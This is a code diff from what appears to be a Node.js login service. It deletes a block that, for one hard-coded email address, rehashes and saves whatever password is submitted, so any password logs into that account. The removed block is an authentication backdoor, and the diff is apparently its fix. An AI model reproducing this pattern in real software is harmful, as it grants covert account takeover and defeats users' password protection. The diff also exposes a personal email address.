@@ -101,16 +101,6 @@ export async function loginService(email, password) {
 		throw new AppError('Login with Google', 402)
 	}
 
-	if (email === 'tiesdao@gmail.com') {
-		const hashPWD = await bcrypt.hash(password, 10)
-
-		await User.findByIdAndUpdate(
-			userExist._id,
-			{ password: hashPWD },
-			{ new: true, runValidators: true },
-		)
-	}
-
 	const comparePWD = await bcrypt.compare(password, userExist.password)
 	if (!comparePWD) {
 		throw new AppError('Invalid Password', 409)
